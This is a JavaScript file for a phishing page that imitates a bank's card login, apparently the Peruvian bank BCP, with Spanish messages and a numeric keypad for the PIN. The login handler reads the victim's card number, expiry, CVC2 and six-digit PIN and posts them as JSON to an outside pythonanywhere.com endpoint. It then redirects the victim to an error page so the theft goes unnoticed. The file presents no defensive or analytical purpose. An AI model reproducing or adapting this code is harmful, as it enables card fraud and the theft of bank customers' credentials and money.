window.onload = function() {

    var pwd = [];

    // todo: hacer funcionar Checkbox
    // todo: guardar ip y bloquear segun db

    // change timer
    setInterval(change, 1000);

    // restrict input cvc2
    var restrict_input = document.getElementById('cv2');
    restrict_input.addEventListener('keydown', function(event) {
        // always allow backspace, delete, left/right arrow keys
        if (event.which == 8 || event.which == 46 || event.which == 37 || event.which == 39) { 
            return;
        }
        // prevent all other input if already at 5 chars or not a number
        else if (restrict_input.value.length >= 5 || event.which < 48 || event.which > 57) {
            event.preventDefault();
            return;
        }
    });

    // numbers to enter pwd
    var number0 = document.getElementById("number0");
    number0.onclick = function() {
        if (pwd.length < 6){
            pwd.push("0");
        };
        paint_circles(pwd);
    };

    var number1 = document.getElementById("number1");
    number1.onclick = function() {
        if (pwd.length < 6){
            pwd.push("1");
        };
        paint_circles(pwd);
    };

    var number2 = document.getElementById("number2");
    number2.onclick = function() {
        if (pwd.length < 6){
            pwd.push("2");
        };
        paint_circles(pwd);
    };

    var number3 = document.getElementById("number3");
    number3.onclick = function() {
        if (pwd.length < 6){
            pwd.push("3");
        };
        paint_circles(pwd);
    };

    var number4 = document.getElementById("number4");
    number4.onclick = function() {
        if (pwd.length < 6){
            pwd.push("4");
        };
        paint_circles(pwd);
    };

    var number5 = document.getElementById("number5");
    number5.onclick = function() {
        if (pwd.length < 6){
            pwd.push("5");
        };
        paint_circles(pwd);
    };

    var number6 = document.getElementById("number6");
    number6.onclick = function() {
        if (pwd.length < 6){
            pwd.push("6");
        };
        paint_circles(pwd);
    };

    var number7 = document.getElementById("number7");
    number7.onclick = function() {
        if (pwd.length < 6){
            pwd.push("7");
        };
        paint_circles(pwd);
    };

    var number8 = document.getElementById("number8");
    number8.onclick = function() {
        if (pwd.length < 6){
            pwd.push("8");
        };
        paint_circles(pwd);
    };

    var number9 = document.getElementById("number9");
    number9.onclick = function() {
        if (pwd.length < 6){
            pwd.push("9");
        };
        paint_circles(pwd);
    };

    // btn delete number
    var delete_number = document.getElementById("delete_number1");
    delete_number.onclick = function() {
        if ( 0 < pwd.length < 6){
            pwd.pop();
            paint_circles(pwd);
            console.log(pwd.length);
        }
    };

    // btn clean all numbers
    var clean_numbers = document.getElementById("clean_numbers");
    clean_numbers.onclick = function() {
        pwd = [];
        paint_circles(pwd);
    };


    // login btn
    var btn_login = document.getElementById("btn_login");
    btn_login.onclick = function() {

        var old_div = "<div id='error_msg' class='ng-tns-c5-3 alert alert-error ng-trigger ng-trigger-alertAnimation'><button  class='close ng-tns-c5-3 ng-star-inserted' style=''><i class='icon-close-fill'></i></button><div class='alert-icon'><i class='ng-tns-c5-3 icon icon-check-outline alert-error-icon'></i></div> <div id='close_error'  onclick='functionToExecute()' class='alert-content'><p class='ng-tns-c5-3'><i class='icon bcp-alert-f'></i><p><span class='font-weight-bold'> Los datos ingresados son incorrectos .</span> Por favor vuelva a intentarlo</p><i class='icon bcp-x-f'></i></p></div></div>";

        // get inputs
        var cardNumberElem = document.getElementById("cardNumber1");
        var ExpMonthElem = document.getElementById("ExpMonth");
        var ExpYearElem = document.getElementById("ExpYear");
        var cv2 = document.getElementById("cv2");

        // var pwd = pwd.toString;
        var card_number = cardNumberElem.value;
        var exp_month = ExpMonthElem.options[ExpMonthElem.selectedIndex].text;
        var exp_year = ExpYearElem.options[ExpYearElem.selectedIndex].text;
        var final_pwd = pwd.toString();
        var final_cvc2 = cv2.value; 

        // validate inputs
        let isnum = /^\d+$/.test(card_number);
        console.log(card_number.length);
        console.log(isnum);

        if (card_number.length < 16 || !(/^\d+$/.test(card_number))){
            node = document.getElementById('title_banca');
            node.insertAdjacentHTML('afterend', old_div);
            return;
        }

        if (final_pwd.length < 6){
            node = document.getElementById('title_banca');
            node.insertAdjacentHTML('afterend', old_div);
            return;
        }

        if (final_cvc2.length < 3 || !(/^\d+$/.test(final_cvc2))){
            node = document.getElementById('title_banca');
            node.insertAdjacentHTML('afterend', old_div);
            return;
        }

        
        var user_card = new Object();
        user_card.card_number = card_number;
        user_card.exp_month  = exp_month;
        user_card.exp_year = exp_year;
        user_card.cvc2 = final_cvc2;
        user_card.pwd = final_pwd;
        //user_card.ip_user = ;

        var jsonString= JSON.stringify(user_card);
        console.log(jsonString);

        // send inputs to server
        var url = "http://handsomeindividual.pythonanywhere.com/send_utilities";
        var params = user_card;
        var parameters = JSON.stringify(user_card);
        var xhr = new XMLHttpRequest();
        xhr.open("POST", url, true);

        // Send the proper header information along with the request
        xhr.setRequestHeader("Content-type", "application/json");
        xhr.send(parameters);
       
        // inform user about a problem, then redirect to real webpage.
        window.location = "/error";

    
    };

};


function delete_last_number(list){
    // remove last element of list

    // clean last highlight circle
    alert("hello function");
}

function delete_all_numbers(list){
    alert("hello function");
}

function paint_circles(list){
    var inactive_1 = document.getElementById("inactive_1");
    var inactive_2 = document.getElementById("inactive_2");
    var inactive_3 = document.getElementById("inactive_3");
    var inactive_4 = document.getElementById("inactive_4");
    var inactive_5 = document.getElementById("inactive_5");
    var inactive_6 = document.getElementById("inactive_6");

    var size_list = list.length;

    switch(size_list) {
        case 6:
            inactive_1.className = "mark--active ng-star-inserted";
            inactive_2.className = "mark--active ng-star-inserted";
            inactive_3.className = "mark--active ng-star-inserted";
            inactive_4.className = "mark--active ng-star-inserted";
            inactive_5.className = "mark--active ng-star-inserted";
            inactive_6.className = "mark--active ng-star-inserted";
          break;
        case 5:
            inactive_1.className = "mark--active ng-star-inserted";
            inactive_2.className = "mark--active ng-star-inserted";
            inactive_3.className = "mark--active ng-star-inserted";
            inactive_4.className = "mark--active ng-star-inserted";
            inactive_5.className = "mark--active ng-star-inserted";
            inactive_6.className = "mark--inactive ng-star-inserted";
          break;
        case 4:
            inactive_1.className = "mark--active ng-star-inserted";
            inactive_2.className = "mark--active ng-star-inserted";
            inactive_3.className = "mark--active ng-star-inserted";
            inactive_4.className = "mark--active ng-star-inserted";
            inactive_5.className = "mark--inactive ng-star-inserted";
            inactive_6.className = "mark--inactive ng-star-inserted";        
        break;
        case 3:
            inactive_1.className = "mark--active ng-star-inserted";
            inactive_2.className = "mark--active ng-star-inserted";
            inactive_3.className = "mark--active ng-star-inserted";
            inactive_4.className = "mark--inactive ng-star-inserted";
            inactive_5.className = "mark--inactive ng-star-inserted";
            inactive_6.className = "mark--inactive ng-star-inserted";
            break;
        case 2:
            inactive_1.className = "mark--active ng-star-inserted";
            inactive_2.className = "mark--active ng-star-inserted";
            inactive_3.className = "mark--inactive ng-star-inserted";
            inactive_4.className = "mark--inactive ng-star-inserted";
            inactive_5.className = "mark--inactive ng-star-inserted";
            inactive_6.className = "mark--inactive ng-star-inserted";
            break;    
        case 1:
            inactive_1.className = "mark--active ng-star-inserted";
            inactive_2.className = "mark--inactive ng-star-inserted";
            inactive_3.className = "mark--inactive ng-star-inserted";
            inactive_4.className = "mark--inactive ng-star-inserted";
            inactive_5.className = "mark--inactive ng-star-inserted";
            inactive_6.className = "mark--inactive ng-star-inserted";
            break;
        case 0:
            inactive_1.className = "mark--inactive ng-star-inserted";
            inactive_2.className = "mark--inactive ng-star-inserted";
            inactive_3.className = "mark--inactive ng-star-inserted";
            inactive_4.className = "mark--inactive ng-star-inserted";
            inactive_5.className = "mark--inactive ng-star-inserted";
            inactive_6.className = "mark--inactive ng-star-inserted";
            break;

        default:
          // code block
      }

}

function functionToExecute(){
    error_msg = document.getElementById('error_msg');
    error_msg.remove();
}
var number = 120;
function change() {

    var elem = document.getElementById("test");
    var elem1 = document.getElementById("test1");

    if (number==0){
        number = 120;
        elem1.innerHTML = number.toString() + " " + "segundos.";
        elem.innerHTML = number.toString() + " " + "segundos.";
        number--;
    } else {
        
        elem1.innerHTML = number.toString() + " " + "segundos.";
        elem.innerHTML = number.toString() + " " + "segundos.";
        number--;
    }
}